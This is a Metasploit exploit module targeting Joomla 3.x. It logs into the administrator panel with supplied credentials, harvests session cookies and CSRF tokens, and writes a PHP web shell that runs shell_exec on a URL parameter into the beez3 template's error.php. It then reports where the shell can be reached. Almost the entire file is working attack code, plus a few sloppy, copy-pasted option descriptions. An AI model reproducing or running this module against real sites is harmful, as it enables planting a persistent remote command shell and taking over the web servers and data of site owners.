##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "This module was created as a part of grabash.py",
      'Description'    => %q{
        If you know the password, feel free to upload shell to your Joomla.
        PHP-webshell will be located in error.php file.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'code16' # Metasploit module
        ],
      'References'     =>
        [
           [ 'URL', 'http://code610.blogspot.com' ]
        ],
      'Payload'        =>
        {
          'DisableNops' => true,
          # Arbitrary big number. The payload gets sent as POST data, so
          # really it's unlimited
          'Space'       => 262144, # 256k
        },
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Joomla 3.x', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "20.08.2016",
      'DefaultTarget'  => 0))

      register_options(
        [
                  OptString.new('USERNAME', [true, 'The base path to Joomla', 'admin']),
                  OptString.new('PASSWORD', [true, 'The base path to Joomla', 'admin']),
                  OptString.new('TARGETURI', [true, 'The base path to Joomla', '/joomla2'])
        ], self.class)
  end # of initialize()


  def check
  end



  # grab token from resp.page
  def grabToken(astring)
    if astring  =~ /([0-9a-fA-F]{32})/
      return $1
    end
    return nil
  end

  def exploit
    first_req = send_request_cgi({ # get cookie and token
        'method'        => 'GET',
        'uri'           => normalize_uri(target_uri.path, 'administrator', 'index.php'),
        'vars_get'      => {
              'option'        => 'com_templates',
               'view'          => 'template',
               'id'            => 503,
               'file'          => 'L2Vycm9yLnBocA%3D%3D'
        }
    })

    # get token
    token_pattern = /(<input type=\"hidden\" name=\"[a-zA-Z0-9]*\" value=\"1\")/
    if first_req.body =~ token_pattern
      token = grabToken(first_req.body)
      print_good("Got token : " + token.to_s)
    else
      print_fail("Can not find token :/")
    end

    # get cookie
    gotCookies = first_req['set-cookie']
    cookies = first_req.get_cookies.sub(/HttpOnly/, "")
    print_good("Got cookie : " + cookies)
#    print_status("Resp code: " + first_req.code.to_s)

    ######################################################################
#    print_status("Starts here:")

    filename = '/error.php'

    # Log in as admin; if resp.code = 303, you will be redirected to admins panel
    adminme = send_request_cgi({
        'method'        => 'POST',
        'uri'           => normalize_uri(target_uri.path, 'administrator', 'index.php'),
        'cookie'        => cookies,
        'vars_post'     => {
                'username'      => datastore['USERNAME'],
                'passwd'        => datastore['PASSWORD'],
                'option'        =>  'com_login',
                'task'          => 'login',
                token.to_s      => 1,
                'return'        => 'aW5kZXgucGhwP29wdGlvbj1jb21fdGVtcGxhdGVzJnZpZXc9dGVtcGxhdGUmaWQ9NTAzJmZpbGU9TDJWeWNtOXlMbkJvY0ElM0QlM0Q%3D'
        },
        token.to_s      => 1
    })

    if adminme.code == 303
      print_good("Welcome admin ;) Your code is: " + adminme.code.to_s)
#      print_status("Token now: " + token.to_s)
    end

    # Grab token
    if adminme && adminme.code == 303 && adminme.headers['Location']
      location = adminme.headers['Location']
 #     print_status("#{peer} - Following redirect to [ #{location} ]")
      print_good("We found a good location :)")
      res = send_request_cgi(
        'uri'    => location,
        'method' => 'GET',
        'cookie' => cookies
      )

#      print_status(res.code.to_s)
      # Retrieving template token
      if res && res.code == 200 && res.body =~ /&amp;([a-z0-9]+)=1\">/
        token = $1
#        print_status("#{peer} - Token [ #{token} ] retrieved")
      else
        fail_with(Failure::Unknown, "#{peer} - Retrieving token failed")
      end
    end



    filename_base64 = Rex::Text.encode_base64("/error.php")
    payload = "<?php echo '<pre>'.shell_exec($_GET[\'x\']);"

#    print_status("Current token: " + token.to_s)

    # Last request; inject payload data into file
    print_status("#{peer} - Insert payload into file [ #{filename} ]")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, "administrator", "index.php"),
      'cookie'  => cookies,
      'vars_get' => {
        'option' => 'com_templates',
        'view' => 'template',
        'id' => '503',
        'file' => filename_base64,
        },
      'vars_post' => {
        'jform[source]' => payload,
        'task' => 'template.apply',
        token => '1',
        'jform[extension_id]' => '503',
        'jform[filename]' => filename
      },
      token => '1'
      })
    if res && res.code == 303
      print_status("Code after final request: " + res.code.to_s)

      print_good("Everything is good, your shell is waiting here:")
      print_good("./templates/beez3/error.php?x=cmd")
    end
    print_status("Finished.")

  end # of expl
end # of file

